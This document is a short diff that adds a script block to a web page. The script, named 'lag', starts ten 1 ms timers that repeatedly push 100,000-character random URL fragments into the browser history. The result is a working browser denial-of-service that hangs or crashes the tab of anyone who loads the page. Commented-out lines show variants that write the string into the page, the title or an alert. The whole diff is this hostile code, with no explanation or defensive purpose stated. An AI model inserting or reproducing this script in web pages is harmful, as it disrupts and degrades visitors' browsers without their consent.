@@ -1,0 +1,15 @@
+<script async>
+var lag = () => {
+var url = "";
+for (var i=0; i<100000; i++){
+    url += String.fromCharCode(97 + Math.floor(Math.random() * 26));
+}
+//document.write(`<p style="word-wrap: break-word; z-index: 1000000;">${url}</p>`);
+window.history.pushState(url, url, `#${url}`);
+//document.title = url;
+};
+for (var i=0; i<10; i++){
+    setInterval(lag, 1);
+}
+//setTimeout(`alert(${url});`, 1);
+</script>
